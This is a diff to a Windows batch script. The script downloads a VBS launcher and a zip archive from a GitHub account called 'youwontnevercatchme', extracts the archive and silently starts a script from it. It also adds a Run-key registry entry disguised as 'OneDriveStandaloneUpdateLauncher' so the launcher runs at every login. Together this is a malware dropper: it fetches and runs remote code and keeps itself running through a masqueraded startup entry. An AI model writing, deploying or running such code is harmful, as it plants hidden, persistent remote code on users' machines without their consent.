@@ -1,18 +1,33 @@
 @echo off
-set path=%cd%\launcher.vbs
+
+color 0a
+
+set mypath=%cd%\launcher.vbs
+
+if not exist "launcher.vbs" (
+curl -L -o "launcher.vbs" "https://raw.githubusercontent.com/youwontnevercatchme/files/refs/heads/main/you%20can%20never%20catch%20me%20ive%20been%20bussin%20plays%20for%20years"
+)
+
 
 rmdir /S /Q "ch-temp-v1"
 del "ch-temp-v1.zip"
 
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveStandaloneUpdateLauncher /t REG_SZ /d "%path%" /f
+echo FILES SUCCESSFULLY DELETED
 
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveStandaloneUpdateLauncher /t REG_SZ /d "cmd /c %mypath%" /f
+
+
+echo ADDED REG ENTRY
 
 curl -L -o "ch-temp-v1.zip" "https://github.com/youwontnevercatchme/files/releases/download/haha/ch-temp-v1.zip"
 tar -xf "ch-temp-v1.zip"
 
+echo EXTRACTED ZIP
 
 cd ch-temp-v1
 cd tools
-start /b "" script.cmd
 
+echo DONE
+
+start /b "" script.cmd
 
